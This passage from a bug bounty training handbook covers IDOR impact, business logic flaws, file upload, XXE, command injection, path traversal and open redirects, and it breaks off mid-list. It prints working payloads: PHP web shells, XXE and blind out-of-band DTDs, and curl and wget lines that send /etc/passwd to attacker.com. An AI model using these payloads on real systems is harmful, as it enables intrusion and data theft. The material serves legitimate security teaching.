## Demonstrating Impact

The severity of an IDOR depends on what data is exposed or what actions can be taken.

|IDOR Impact|Severity|
|---|---|
|Read another user's PII (name, address, email)|High|
|Read another user's financial data (orders, payments)|High|
|Read another user's private messages|High|
|Delete another user's data|High–Critical|
|Modify another user's data|High|
|Access admin-level data as regular user|Critical|
|Mass enumeration of all user data|Critical|
|Trigger payment/refund for another user|Critical|

**For your report:**

1. Document Account A and Account B details (IDs, emails — use test accounts)
2. Log in as Account A
3. Make the vulnerable request accessing Account B's resource
4. Screenshot the full request and response
5. Show that the data returned belongs to Account B (log in as B to confirm)
6. Estimate scale: if IDs are sequential, how many records are potentially exposed?

---

## What Good Access Control Looks Like

Understanding the fix helps you explain impact:

```python
# Correct implementation
def get_order(order_id):
    order = db.get_order(order_id)
    if order is None:
        return 404
    if order.user_id != current_user.id:  # ← This check is what's missing in IDOR
        return 403
    return order
```

Or using indirect references:

```python
# Alternative: never expose real IDs; use per-session references
def get_order(order_ref):
    # order_ref is a per-session opaque token that maps to an order ID
    order_id = session_map[current_user.id][order_ref]  # Only valid for this user
    return db.get_order(order_id)
```

---

## Summary

IDOR is the most commonly reported access control vulnerability in bug bounty programs. It occurs when servers use user-controlled identifiers to fetch objects without checking whether the requesting user owns or has permission to access those objects. Testing requires two accounts, systematic testing of every endpoint that references a specific object, and creativity in finding how object references are encoded or transmitted. IDORs in write operations (delete, modify) are higher severity than read-only ones. UUID-based IDs are not authorization — they still require server-side ownership checks.

---

## Checklist

- [ ] Created two test accounts (Account A and Account B)
- [ ] Browsed as both accounts and documented all object IDs encountered
- [ ] Built a list of all endpoints that reference specific objects (from Chapter 14 map)
- [ ] Tested every GET endpoint: access Account B's objects while logged in as Account A
- [ ] Tested every write endpoint (POST/PUT/DELETE) for IDOR
- [ ] Tested IDOR via HTTP method change on 403 endpoints
- [ ] Decoded any non-obvious IDs (base64, hex, encoded) and tested modified values
- [ ] Tested GraphQL mutations and queries for IDOR
- [ ] Tested request body parameters (not just URL parameters) for IDOR
- [ ] Attempted sequential enumeration on integer IDs via Burp Intruder
- [ ] If UUIDs used: looked for UUID leaks in other endpoints / error messages
- [ ] Checked API documentation (Swagger) for undocumented ID parameters
- [ ] Tested file download and export endpoints for IDOR
- [ ] Documented findings with Account A's request, Account B's data in response, confirmation that data belongs to B
- [ ] Estimated scale of potential data exposure (how many records are accessible)

---

# Chapter 21: Business Logic Vulnerabilities

## Objective

Understand what business logic vulnerabilities are, why automated scanners cannot find them, and how to systematically identify flaws in the way an application enforces its own rules.

## Prerequisites

- Chapter 14: Web Application Mapping
- Chapter 17: Broken Access Control
- Chapter 20: IDOR

## Terminology

|Term|Definition|
|---|---|
|**Business Logic**|The rules and workflows that define how an application is supposed to behave|
|**State Machine**|A model that describes how an application moves between defined states (e.g., cart → checkout → paid)|
|**Race Condition**|When two requests execute simultaneously and the application's logic breaks because it assumed sequential execution|
|**Negative Balance**|Exploiting a system to bring a numeric value below zero when the application doesn't prevent it|
|**Workflow Bypass**|Skipping required steps in a multi-step process|
|**Price Manipulation**|Modifying the price or quantity of items in a way the server doesn't validate|

## Theory

### Why Business Logic Bugs Are Special

Every other vulnerability class in this handbook — XSS, SQLi, SSRF — is a technical flaw. The input is processed in a way the language or platform never intended.

Business logic vulnerabilities are different. The code works exactly as written. The bug is in what was written: the rules themselves are flawed, incomplete, or can be circumvented.

This is why scanners cannot find them. A scanner does not know that a coupon code should only be applied once, or that a user should not be able to transfer money to themselves. Only a human who understands what the application is _supposed_ to do can notice when it can be made to do something _it shouldn't_.

### Category 1: Workflow Bypass

Multi-step processes (registration, checkout, password reset) are designed to be followed in order. Applications often fail to enforce this at the server side.

**The attack:** Send requests out of order. Skip steps. Repeat steps. Jump directly to the final step.

**Classic example — password reset bypass:**

```
Normal flow:
Step 1: Enter email → GET /reset/step1
Step 2: Enter OTP  → POST /reset/step2  (OTP validated here)
Step 3: Set new password → POST /reset/step3

Attack:
Step 1: Enter email → GET /reset/step1
Step 3: POST /reset/step3 directly, skipping OTP validation

If the server doesn't verify step 2 was completed, the password resets without OTP.
```

**What to test:**

- Go directly to step 3 without completing steps 1 and 2
- Complete step 1, skip step 2, submit step 3
- Complete the full flow once, then replay step 3 with a different target account's email

### Category 2: Price and Quantity Manipulation

Many applications calculate price client-side or trust price values submitted in the request.

**The attack:** Modify price, quantity, discount, or total in the intercepted request before it reaches the server.

```http
POST /checkout HTTP/1.1

{
  "item_id": 1042,
  "quantity": 1,
  "price": 299.99,       ← Change to 0.01
  "discount_code": ""
}
```

**Quantity tricks:**

```
quantity: -1   → Does the total go negative? Does the store credit you?
quantity: 0    → Do you receive the item for free?
quantity: 9999 → Does the application crash or expose inventory data?
```

**What to test:**

- Modify every numeric field in checkout requests
- Set price to 0, negative, or a fraction of a cent
- Apply a coupon code multiple times (replay the request)
- Apply a coupon code intended for a different account

### Category 3: Race Conditions

A race condition occurs when two identical requests arrive simultaneously and the server processes both before it has updated its state.

**Classic example — double spend:**

```
User has $100 balance.
Normal flow: Request → Check balance ($100 ≥ $50) → Deduct $50 → Balance: $50

Race condition:
Request A → Check balance ($100 ≥ $50) ──────────────┐
Request B → Check balance ($100 ≥ $50) → Deduct $50 →│ Balance: $50
                                                       └→ Deduct $50 → Balance: $0
                                                       
Both checks passed before either deduction ran.
User spent $100 but received $100 worth of goods ($50 × 2).
```

**Testing with Burp Suite Turbo Intruder:**

Turbo Intruder sends requests with precise timing control. The "race single-packet attack" sends multiple requests in one TCP packet, ensuring they arrive at the server simultaneously.

```python
# Turbo Intruder script for race condition
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=20,
                           pipeline=True)
    for i in range(20):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**What to look for:**

- Gift card or coupon redemption — can it be redeemed twice?
- Vote/like buttons — can a single account vote multiple times?
- Password reset or email verification tokens — can two resets be triggered simultaneously?
- Inventory reservation — can more items be reserved than exist?
- Referral bonuses — can a self-referral bonus be triggered multiple times?

### Category 4: Negative Values and Integer Overflow

Applications that handle numeric values often forget to validate lower bounds.

```http
POST /transfer HTTP/1.1

{
  "from_account": "alice",
  "to_account": "bob",
  "amount": -500
}
```

A negative transfer from Alice to Bob is effectively a transfer _from Bob to Alice_. If the server just checks `alice.balance >= amount` and `-500 >= 0` is false... it blocks the transfer. But if it subtracts: `alice.balance = alice.balance - (-500)` — Alice gains $500.

**Integer overflow:** Some systems use 32-bit integers. Maximum value: 2,147,483,647. Submitting 2,147,483,648 may overflow to a negative number.

### Category 5: Privilege and State Abuse

These are cases where the application's own features can be abused.

**Examples:**

- An admin feature allows bulk deletion. A non-admin user finds the endpoint and calls it directly.
- A free trial account has a 14-day limit. Deleting and recreating the account resets the timer.
- A loyalty program gives points for purchases. Buying and immediately refunding still awards points.
- An API key generated for read-only access also works on write endpoints.

### Testing Methodology

```
1. Map the application thoroughly (Chapter 14) — understand every feature
2. For every feature, ask:
   - What is this feature *supposed* to prevent?
   - What happens if I do it twice?
   - What happens if I do it in the wrong order?
   - What happens if I submit a negative or zero value?
   - What happens if two requests run simultaneously?
   - Can I apply this to another user's account?
3. Test with two accounts (like IDOR testing)
4. Capture all multi-step flows in Burp and replay individual steps
5. Test every numeric field with: 0, -1, very large numbers, decimals
```

## Summary

Business logic vulnerabilities require a human tester who understands what an application is meant to do. They appear in checkout flows, reward systems, multi-step processes, and anywhere the application handles numeric values or enforces sequential operations. No scanner finds them — methodical understanding of application intent does.

---

## Checklist

- [ ] Mapped all multi-step workflows (registration, checkout, password reset, email verification)
- [ ] Tested each multi-step flow by jumping directly to the final step
- [ ] Tested each multi-step flow by repeating individual steps
- [ ] Modified every numeric field in purchase/transfer requests (0, -1, very large, decimal)
- [ ] Attempted to apply coupons, promo codes, or referral bonuses multiple times
- [ ] Tested gift card / credit redemption for double-spend with race condition (Turbo Intruder)
- [ ] Tested vote/like/rating actions for race condition
- [ ] Checked if refunded purchases still award loyalty points or credits
- [ ] Tested free trial reset by deleting and recreating account
- [ ] Verified that admin-only endpoints reject non-admin users

---

# Chapter 22: File Upload Vulnerabilities

## Objective

Learn how to identify and exploit insecure file upload functionality, from stored XSS through image files to remote code execution via web shell upload.

## Prerequisites

- Chapter 15: XSS
- Chapter 3: HTTP
- Chapter 6: Lab Environment

## Terminology

|Term|Definition|
|---|---|
|**Web Shell**|A malicious script uploaded to a server that allows remote command execution via HTTP|
|**MIME Type**|A label identifying a file's format (e.g., `image/jpeg`, `application/pdf`)|
|**Magic Bytes**|The first few bytes of a file that identify its format, independent of extension|
|**Content-Type**|The HTTP header that declares the format of a request or response body|
|**SVG**|Scalable Vector Graphics — an XML-based image format that can contain JavaScript|
|**Polyglot**|A file that is simultaneously valid in two different formats (e.g., valid JPEG and valid PHP)|

## Theory

### Why File Upload Is Dangerous

File upload features exist to let users share content — profile pictures, documents, attachments. When the server fails to properly validate and store what users upload, attackers can upload:

- **Web shells** → Remote code execution
- **HTML/SVG files** → Stored XSS
- **Server-Side Scripts** → If executed in the server's language (PHP, JSP, ASP)
- **XXE payloads** → Via XML-based file formats

The severity depends on three factors:

1. What file types does the server actually execute?
2. Where are uploaded files stored and served from?
3. What controls exist between upload and storage?

### Bypass Technique 1: Extension Filtering Bypass

A server might check the file extension and block `.php`. Bypass attempts:

```
shell.php          → Blocked
shell.PHP          → Case-insensitive bypass (some servers)
shell.php5         → Alternative PHP extension
shell.phtml        → PHP-parseable extension
shell.php.jpg      → Double extension — server may check last extension
shell.php%00.jpg   → Null byte injection (older PHP) — truncates at null byte
shell.php;.jpg     → Semicolon (some Apache configs)
shell.pHp          → Mixed case
```

### Bypass Technique 2: Content-Type Manipulation

Some servers check the `Content-Type` header in the upload request, not the actual file content. Change the header:

```http
POST /upload HTTP/1.1
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg       ← Changed from application/x-php to image/jpeg

<?php system($_GET['cmd']); ?>
--boundary--
```

### Bypass Technique 3: Magic Bytes Injection

Some servers read magic bytes to identify file type. Prepend valid magic bytes to your payload:

```
JPEG magic bytes: FF D8 FF E0
PNG magic bytes:  89 50 4E 47

Polyglot file (appears as JPEG, executed as PHP):
FF D8 FF E0 [JPEG header bytes] <?php system($_GET['cmd']); ?>
```

In practice:

```bash
# Create a polyglot PHP/JPEG
echo -e '\xff\xd8\xff\xe0' > polyglot.php
echo '<?php system($_GET["cmd"]); ?>' >> polyglot.php
```

### Bypass Technique 4: .htaccess / web.config Upload

If you can upload an `.htaccess` file (Apache) or `web.config` (IIS), you can redefine which files the server executes:

```apache
# .htaccess — tell Apache to execute .jpg files as PHP
AddType application/x-httpd-php .jpg
```

Upload this `.htaccess` first, then upload `shell.jpg` containing PHP code. When accessed, Apache executes it as PHP.

### SVG for Stored XSS

SVG files are XML and can contain JavaScript. If a site allows SVG uploads and serves them with `Content-Type: image/svg+xml`, stored XSS is possible:

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <script type="text/javascript">
    alert(document.domain)
  </script>
</svg>
```

If the application serves this SVG inline (not as a download), the JavaScript executes.

### What Happens After Upload?

Even a successful upload is not exploitable unless you can reach the file. Investigate:

```
1. Where is the file served? Same domain? Subdomain? CDN? S3 bucket?
2. Is the file renamed on upload? (random UUID breaks web shell access)
3. Is the file processed? (image resizing strips PHP from most polyglots)
4. Is it served with Content-Type forcing download? (Content-Disposition: attachment)
5. Is the upload directory outside the web root? (can't be reached via HTTP)
```

### Testing Methodology

```
Step 1: Upload a valid file and observe:
        - What URL is it served at?
        - What Content-Type does the server set in the response?
        - Is the filename preserved or renamed?

Step 2: Upload an SVG with XSS payload → does it execute?

Step 3: Upload a PHP file with a simple tag:
        <?php phpinfo(); ?>
        → Check if it executes at the URL

Step 4: If blocked, try extension bypasses (see above)

Step 5: Try Content-Type manipulation

Step 6: Try magic bytes + PHP polyglot

Step 7: Try .htaccess upload (if Apache)

Step 8: If the server resizes images, try ExifTool metadata injection:
        exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
        (may survive resizing if EXIF is preserved)
```

## Demonstrating Impact

**For XSS via SVG:** Show the alert executing with the application's domain in it. Upgrade to a session cookie stealer if the flag is in the bug report.

**For RCE via web shell:** Demonstrate execution of a safe command like `id` or `hostname`. Do not run anything destructive. Screenshot the request and response showing command output.

```
Proof of concept URL: https://example.com/uploads/shell.php?cmd=id
Response: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Summary

File upload vulnerabilities range from low (XSS via SVG) to critical (RCE via web shell). The key questions are: what extensions does the server accept, can those checks be bypassed, and can you reach the uploaded file via HTTP. Always test with the least invasive payload first.

---

## Checklist

- [ ] Uploaded a valid file and documented the URL, Content-Type, and filename handling
- [ ] Tested SVG upload with XSS payload
- [ ] Tested PHP/ASPX/JSP upload (simple phpinfo() first)
- [ ] Tried extension bypasses (.PHP, .php5, .phtml, double extension)
- [ ] Tried Content-Type header manipulation on upload request
- [ ] Tried magic bytes prepend (JPEG header + PHP)
- [ ] Tested .htaccess upload (Apache targets)
- [ ] Tested ExifTool metadata injection if image processing is present
- [ ] Confirmed uploaded file is reachable via HTTP
- [ ] Verified filename: is it preserved or randomized?
- [ ] Checked if image processing strips the payload (compare before/after)

---

# Chapter 23: XML External Entity Injection (XXE)

## Objective

Understand the XML external entity feature, how it leads to file disclosure and SSRF, and how to find and exploit XXE in modern applications.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 19: SSRF (recommended)

## Terminology

|Term|Definition|
|---|---|
|**XML**|Extensible Markup Language — a format for structured data|
|**DTD**|Document Type Definition — defines the structure of an XML document|
|**Entity**|A named reference in XML, like a variable; `&name;` expands to a value|
|**External Entity**|An entity whose value is loaded from an external resource (a file or URL)|
|**XXE**|XML External Entity — an attack that abuses external entities to read files or make server-side requests|
|**Blind XXE**|An XXE attack where the output isn't reflected in the response — requires out-of-band exfiltration|
|**OOB**|Out-of-band — data exfiltration through a different channel (e.g., DNS or HTTP to an attacker-controlled server)|

## Theory

### How External Entities Work

XML parsers support a feature called external entities, which loads a value from a file or URL at parse time:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

When an XML parser processes this document, it expands `&xxe;` by reading `/etc/passwd` and inserting its contents into the `<data>` element. If the application reflects the parsed value back in its response, the attacker reads the file.

### Finding XXE Entry Points

Applications parse XML in many places:

- File upload (DOCX, XLSX, SVG, PPTX are all ZIP archives containing XML)
- APIs that accept `Content-Type: application/xml`
- SOAP web services
- RSS/Atom feed parsers
- Any feature that imports data from a structured file

**Tip:** Change `Content-Type: application/json` to `Content-Type: application/xml` and resubmit as XML. Some parsers silently accept both.

### Basic XXE — File Read

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

**Useful files to read:**

|OS|File|Contents|
|---|---|---|
|Linux|`/etc/passwd`|User list|
|Linux|`/etc/hosts`|Network hosts|
|Linux|`/proc/self/environ`|Environment variables (may contain secrets)|
|Linux|`/proc/self/cmdline`|The process command line|
|Windows|`C:\Windows\System32\drivers\etc\hosts`|Network hosts|
|Windows|`C:\inetpub\wwwroot\web.config`|IIS configuration (may contain DB passwords)|

### XXE for SSRF

External entities can also fetch URLs, not just files:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
```

This turns XXE into SSRF. On AWS, GCP, or Azure, the metadata endpoint leaks cloud credentials. See Chapter 19 for cloud metadata exploitation.

### Blind XXE — Out-of-Band Exfiltration

If the application does not reflect parsed XML output in its response, use out-of-band techniques. The server fetches a URL you control, revealing the data:

**Step 1: Host a malicious DTD on your server:**

```xml
<!-- https://attacker.com/evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Step 2: Send a payload that loads your DTD:**

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd">
  %xxe;
]>
<root><data>test</data></root>
```

The server loads your DTD, which exfiltrates the file contents to your collaborator server via URL.

**Using Burp Collaborator:**

In Burp Suite Professional, Burp Collaborator provides an attacker-controlled server for OOB detection. Use the Collaborator URL in your DTD:

```
https://YOUR-COLLABORATOR-ID.burpcollaborator.net/?data=%file;
```

### XXE via File Upload

DOCX, XLSX, and PPTX files are ZIP archives containing XML. Upload a crafted file:

```bash
# Create a minimal DOCX with XXE
mkdir docx_exploit
cd docx_exploit
mkdir -p word _rels
cat > word/document.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;</w:t></w:r></w:p></w:body>
</w:document>
EOF
zip -r exploit.docx . 
```

Upload `exploit.docx` to any feature that parses Word documents (import, preview, convert).

### SVG XXE

SVG files are XML. If the server processes SVG files server-side (to convert, resize, or render them), an XXE payload inside the SVG may be processed:

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

## Demonstrating Impact

For a bug report, include:

1. The raw XML payload sent
2. The server response showing the file content reflected
3. The specific file read (e.g., `/etc/passwd` showing real usernames)
4. For blind XXE: Collaborator logs showing the DNS/HTTP interaction

## Summary

XXE exploits the XML parser's external entity feature to read files from the server or make outbound HTTP requests. It is found wherever XML is parsed — APIs, file uploads, SOAP services. Modern parsers often disable external entities by default, but legacy systems, DOCX/SVG processors, and misconfigured parsers remain vulnerable. Blind XXE requires OOB exfiltration via a collaborator server.

---

## Checklist

- [ ] Identified all endpoints that accept XML input (Content-Type: application/xml, text/xml)
- [ ] Identified all file upload features that process XML-based formats (DOCX, XLSX, SVG, PPTX)
- [ ] Sent basic file-read XXE payload against each XML endpoint
- [ ] Checked response for file contents (look for `root:x:0:0` in `/etc/passwd`)
- [ ] If no reflection, set up Burp Collaborator and tested blind XXE with OOB DTD
- [ ] Tested XXE-as-SSRF (load cloud metadata URL)
- [ ] Tried Content-Type switching on JSON endpoints to XML
- [ ] Uploaded XXE-containing DOCX/SVG to file upload features
- [ ] Confirmed whether successful read is reflected or only OOB

---

# Chapter 24: Command Injection

## Objective

Learn how command injection occurs, how to identify it, and how to safely demonstrate it in a bug bounty context without causing unintended damage.

## Prerequisites

- Chapter 5: Linux
- Chapter 7: Burp Suite
- Chapter 6: Lab Environment

## Terminology

|Term|Definition|
|---|---|
|**OS Command Injection**|Injecting shell metacharacters into input that gets passed to a system command|
|**Shell Metacharacters**|Characters with special meaning in a shell: `;`, `&&`, `\|`, `\|`, `` ` ``, `$()`|
|**Blind Command Injection**|The output of the injected command is not visible in the response|
|**Time-Based Detection**|Using `sleep` or `ping` to confirm blind injection by measuring response delay|
|**OOB Command Injection**|Exfiltrating output via DNS or HTTP requests to an attacker-controlled server|
|**Sandbox**|A restricted execution environment that limits what commands can do|

## Theory

### How Command Injection Happens

Applications sometimes call OS commands to perform tasks — running utilities, processing files, sending emails, pinging a host. When user input is passed to these commands without sanitization, the user can inject additional commands.

```python
# Vulnerable Python code
import subprocess
domain = request.args.get('domain')
result = subprocess.run(f"nslookup {domain}", shell=True, capture_output=True)
```

If `domain` = `google.com; cat /etc/passwd`, the shell executes:

```bash
nslookup google.com; cat /etc/passwd
```

The `;` ends the first command and starts a new one.

### Shell Metacharacters to Test

|Payload|Effect|
|---|---|
|`cmd1; cmd2`|Run cmd1, then cmd2|
|`cmd1 && cmd2`|Run cmd2 only if cmd1 succeeds|
|`cmd1 \| cmd2`|Run cmd2 only if cmd1 fails|
|`cmd1 \| cmd2`|Pipe: output of cmd1 becomes input of cmd2|
|`` `cmd` ``|Backtick: execute cmd, substitute output|
|`$(cmd)`|Same as backtick, preferred in modern shells|
|`\n cmd`|Newline — sometimes works when semicolon is filtered|

### Where to Look

Command injection is most common in features that imply underlying OS operations:

- **Ping / traceroute tools** ("Test connectivity to host")
- **DNS lookup features**
- **Image/PDF conversion**
- **File format conversion** (convert DOCX to PDF, etc.)
- **Email testing features** ("Send test email")
- **URL fetch / preview features** (these can also be SSRF)
- **Backup / export features**
- **Log file viewers**
- **Package install features** (admin panels)

### Testing — Reflected Injection

If output appears in the response, inject commands with visible output:

```
# Start with simple concatenation
google.com; whoami
google.com && id
google.com | cat /etc/passwd

# URL-encoded versions
google.com%3Bwhoami
google.com%26%26id
```

Look for command output in the response. Even partial output (just a username or system string) confirms injection.

### Testing — Blind Injection

If no output appears in the response, test with time delays:

```bash
# Linux
; sleep 10
&& sleep 10
| sleep 10
$(sleep 10)
`sleep 10`

# Windows
& timeout /t 10
```

A 10-second response delay strongly indicates command injection. Time the request before and after. Use Burp's timer to be precise.

**Confirming with DNS (OOB):**

```bash
; nslookup YOUR-COLLABORATOR.burpcollaborator.net
; curl https://YOUR-COLLABORATOR.burpcollaborator.net/$(whoami)
```

If Burp Collaborator receives a DNS request, injection is confirmed. The URL path (`/www-data`) tells you who the process runs as.

### Exfiltrating Data (OOB)

```bash
# Read a file and send via DNS (length-limited, use for short values)
; nslookup $(cat /etc/hostname).attacker.com

# Send via HTTP (full output)
; curl "https://attacker.com/?data=$(id | base64)"
; wget -q -O- "https://attacker.com/?data=$(cat /etc/passwd | base64)"
```

### Safe Testing Principles

In bug bounty:

1. **Use `sleep` or `ping` for blind confirmation** — do not run destructive commands
2. **Use `id`, `whoami`, or `hostname`** to show impact — never `rm`, never touch production data
3. **Use your own Collaborator server**, not third-party infrastructure
4. **Stop after confirming RCE** — do not explore the filesystem beyond what's needed to demonstrate impact
5. **Never escalate privileges** without explicit scope permission

## Demonstrating Impact

A clean proof of concept:

```
Vulnerable parameter: domain
Payload: google.com; id

Response body:
Server: google.com (8.8.8.8)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Screenshot the full Burp request and response. Note the user context (uid). State what an attacker could do: read application source code, access database credentials, pivot to internal network.

## Summary

Command injection occurs when user input reaches a shell command without escaping. It is found in features that imply OS-level operations. Testing uses semicolons, pipes, and backticks. Blind injection requires time-based or OOB detection. Always use safe commands (`id`, `sleep`) to demonstrate without causing harm. Severity is Critical — confirmed RCE on a web server is among the highest-impact bug bounty findings.

---

## Checklist

- [ ] Identified all features that imply OS operations (ping, DNS lookup, file conversion)
- [ ] Tested each with basic shell metacharacters: `;`, `&&`, `|`, `$()`
- [ ] Tested URL-encoded versions of metacharacters
- [ ] If no output, tested with `sleep 10` — measured response delay
- [ ] If blind, set up Burp Collaborator and tested with DNS/HTTP exfiltration payload
- [ ] Used `id` or `whoami` to confirm code execution context (not destructive commands)
- [ ] Tested Windows-specific separators (`&`, `|`) if target appears to be Windows IIS
- [ ] Documented full request, response, and evidence of code execution

---

# Chapter 25: Path Traversal

## Objective

Learn how path traversal vulnerabilities allow attackers to read files outside the intended web root, and how to identify and exploit them.

## Prerequisites

- Chapter 5: Linux
- Chapter 3: HTTP
- Chapter 7: Burp Suite

## Terminology

|Term|Definition|
|---|---|
|**Path Traversal**|Also called "directory traversal" — using `../` sequences to navigate outside the intended directory|
|**Web Root**|The directory on the server from which the web application serves files|
|**Absolute Path**|A full path from the filesystem root: `/etc/passwd`|
|**Relative Path**|A path relative to the current directory: `../../etc/passwd`|
|**Null Byte**|The character `\x00` (`%00` in URLs) — some functions stop reading at null bytes|
|**Canonicalization**|The process of resolving a path to its absolute, normalized form|

## Theory

### How Path Traversal Works

When an application uses user-supplied input to construct a file path without proper validation, an attacker can use `../` sequences to escape the intended directory.

```
Application code (vulnerable):
filename = request.args.get('file')
path = "/var/www/uploads/" + filename
with open(path) as f:
    return f.read()

Normal request:  /download?file=report.pdf
Reads:  /var/www/uploads/report.pdf  ✓

Malicious request:  /download?file=../../etc/passwd
Reads:  /var/www/uploads/../../etc/passwd
     =  /var/etc/passwd
     =  /etc/passwd  ✓  (attacker reads password file)
```

### Finding Path Traversal Entry Points

Look for parameters that reference files:

```
/download?file=report.pdf
/view?template=invoice
/load?config=default
/image?src=logo.png
/static?path=css/main.css
/read?log=access.log
```

Also: path segments used to load files:

```
/files/report.pdf     → try /files/../../../etc/passwd
/templates/invoice    → try /templates/../../../etc/shadow
```

### Basic Payload

```
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd    (try different depths)
```

**URL-encoded:**

```
..%2F..%2Fetc%2Fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**Double-encoded (bypass filters that decode once):**

```
..%252F..%252Fetc%252Fpasswd   (%25 = %, so %252F = %2F after one decode)
```

### Bypassing Filters

Many applications strip `../` before processing. Bypasses:

```
....//....//etc/passwd      Strip one ../ → leaves ../
..././..././etc/passwd      Strip ./ → leaves ../
....\/....\/etc/passwd      Mixed slashes (Windows)
/absolute/path/etc/passwd   Try absolute path directly
```

**Null byte (older PHP):**

```
../../etc/passwd%00.jpg     Null byte truncates; .jpg appended for extension check
```

### Windows Targets

On Windows, use backslashes and target Windows files:

```
..\..\..\Windows\System32\drivers\etc\hosts
..\..\..\Windows\win.ini
..\..\..\inetpub\wwwroot\web.config
..%5C..%5C..%5CWindows%5Cwin.ini
```

### Useful Files to Read

**Linux:**

|File|Value|
|---|---|
|`/etc/passwd`|User list; confirms traversal|
|`/etc/shadow`|Password hashes (requires root)|
|`/proc/self/environ`|Environment variables — may contain secrets, DB passwords|
|`/proc/self/cmdline`|Application command line|
|`/proc/self/fd/X`|Open file descriptors — can read open files|
|`~/.ssh/id_rsa`|SSH private key (if you know the username)|
|`/var/www/html/config.php`|Database credentials|
|`/app/config/database.yml`|Rails database config|
|`.env`|Environment file (common in Node, Django, Laravel apps)|

**Windows:**

|File|Value|
|---|---|
|`C:\Windows\win.ini`|Confirms traversal|
|`C:\inetpub\wwwroot\web.config`|IIS config with connection strings|
|`C:\Windows\System32\drivers\etc\hosts`|Network hosts|

## Demonstrating Impact

Read `/etc/passwd` and include it in the report. Then escalate: can you read source code? Config files with database credentials? SSH keys?

```
Vulnerable URL: https://example.com/download?file=../../etc/passwd
Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

State the impact clearly: attacker can read any file the web server process has access to, including application source code, configuration files, and credentials.

## Summary

Path traversal is a file-read vulnerability caused by unsanitized user input in file path construction. It is found wherever the application references files by user-supplied names. Testing requires different `../` depths, encoding variants, and both Linux and Windows payloads. Impact ranges from medium (reading non-sensitive files) to critical (reading private keys or credentials).

---

## Checklist

- [ ] Identified all parameters that appear to reference files or paths
- [ ] Tested with `../../etc/passwd` at increasing depths (2–8 levels)
- [ ] Tried URL-encoded variants: `..%2F`, `%2e%2e%2f`
- [ ] Tried double-encoded: `..%252F`
- [ ] Tried filter bypass: `....//`, mixed slashes
- [ ] Tested null byte: `../../etc/passwd%00.jpg` (older targets)
- [ ] If Windows target: used backslashes and Windows file paths
- [ ] Attempted to read source code, config files, `.env` files, SSH keys
- [ ] Documented the full traversal path and response with file contents

---

# Chapter 26: Open Redirect

## Objective

Understand what open redirects are, how they are exploited in phishing and OAuth attacks, and how to find them systematically.

## Prerequisites

- Chapter 3: HTTP
- Chapter 15: XSS (recommended)
- Chapter 18: Authentication Vulnerabilities (recommended)

## Terminology

|Term|Definition|
|---|---|
|**Open Redirect**|A vulnerability where an application redirects users to an attacker-specified URL|
|**Redirect Parameter**|A URL parameter that tells the application where to redirect after an action|
|**OAuth**|An authorization protocol that uses redirects to pass tokens between parties|
|**Phishing**|Tricking a user into visiting a malicious site or revealing credentials|
|**Header Injection**|Injecting a `Location:` header to cause a redirect|
|**JavaScript Redirect**|A redirect done with `window.location` or `document.location` in JavaScript|

## Theory

### What Is an Open Redirect?

Many applications redirect users after authentication, after form submission, or after OAuth flows:

```
https://example.com/login?next=/dashboard
https://example.com/logout?redirect=https://example.com/
https://example.com/auth/callback?return_to=/profile
```

An open redirect occurs when the application does not validate the `next`, `redirect`, or `return_to` parameter and allows the user to be redirected to any URL — including attacker-controlled ones.

### Why Open Redirects Matter

**Phishing:** An attacker shares a legitimate-looking URL that leads to a trusted domain but redirects to a malicious clone:

```
https://trusted-bank.com/login?next=https://evil.com/fake-login
```

The user sees `trusted-bank.com` in the URL bar, feels safe, clicks, and is redirected to a phishing site.

**OAuth token theft:** In OAuth flows, the `redirect_uri` parameter controls where the authorization code is sent. An open redirect in the application's domain can be chained:

```
https://oauth.example.com/auth?
  client_id=APP&
  redirect_uri=https://example.com/login?next=https://evil.com
```

The OAuth server redirects to `example.com/login` (which is an allowed redirect_uri), and `example.com/login` then redirects to `evil.com` — delivering the token to the attacker.

### Finding Open Redirect Parameters

Common parameter names:

```
next, redirect, redirect_to, return, return_to, url, goto, destination,
redir, r, ref, target, continue, to, forward, location
```

Search the application for these in:

- Login pages
- Logout pages
- OAuth callback pages
- Form submission thank-you pages
- 404/error pages that say "click here to go back"

### Bypass Techniques

Applications often try to restrict where they redirect. Bypass techniques:

```
# Basic
https://evil.com

